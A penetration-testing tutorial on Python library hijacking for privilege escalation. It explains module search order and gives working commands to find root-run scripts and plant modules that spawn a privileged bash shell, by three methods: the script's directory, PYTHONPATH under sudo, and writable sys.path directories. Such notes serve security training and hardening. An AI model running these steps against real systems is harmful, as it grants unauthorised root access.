# Python Library Hijacking

## Table of Contents

1. [Overview](#overview)
2. [Python Module Search Order](#python-module-search-order)
3. [Exploitation](#exploitation)

---

## Overview

When a Python script uses `import`, Python resolves the module by searching directories in `sys.path` in order. If we can place a malicious `.py` file with the same name as an imported module in a directory that is searched **before** the legitimate one, Python will load our file instead. There are three main vectors:

1. Place the malicious module in the **script's directory** (always searched first)
2. Modify the `PYTHONPATH` environment variable to prepend a directory we control
3. Write the malicious module into a **writable directory** already in `sys.path` that comes before the legitimate module's location

## Python Module Search Order

When `import module` is called, Python searches in this order:

1. The directory containing the script being executed
2. Directories listed in the `PYTHONPATH` environment variable
3. Default installation paths (e.g., `/usr/lib/python3/dist-packages/`)

```bash
# View the full search order
python3 -c 'import sys; print("\n".join(sys.path))'
```

The first match wins. Python does not verify whether the module is the "correct" one.

## Exploitation

### Identify the target

Look for Python scripts running as root, via cron, SUID wrappers, or sudo:

```bash
cat /etc/crontab
sudo -l
find / -perm -4000 -type f 2>/dev/null
```

Then check which modules the script imports:

```bash
grep -n 'import' /path/to/script.py
```

### Method 1: Script directory hijack

If we can write to the same directory as the target script:

```bash
# Example: script imports "utils"
cat > /path/to/script_dir/utils.py << 'EOF'
import os
os.system("/bin/bash -p")
EOF
```

Next time the script runs, it loads our `utils.py` instead of the real one.

### Method 2: PYTHONPATH injection

If the script is run via sudo and `PYTHONPATH` is preserved (`env_keep+=PYTHONPATH`):

```bash
mkdir /tmp/hijack
cat > /tmp/hijack/utils.py << 'EOF'
import os
os.system("/bin/bash -p")
EOF

sudo PYTHONPATH=/tmp/hijack /path/to/script.py
```

### Method 3: Writable sys.path directory

If a directory in `sys.path` is world-writable and comes before the legitimate module:

```bash
# Find writable directories in sys.path
python3 -c 'import sys; print("\n".join(sys.path))' | xargs -I{} ls -ld {} 2>/dev/null | grep 'w'

# Place the malicious module there
cp malicious.py /writable/sys/path/directory/target_module.py
```
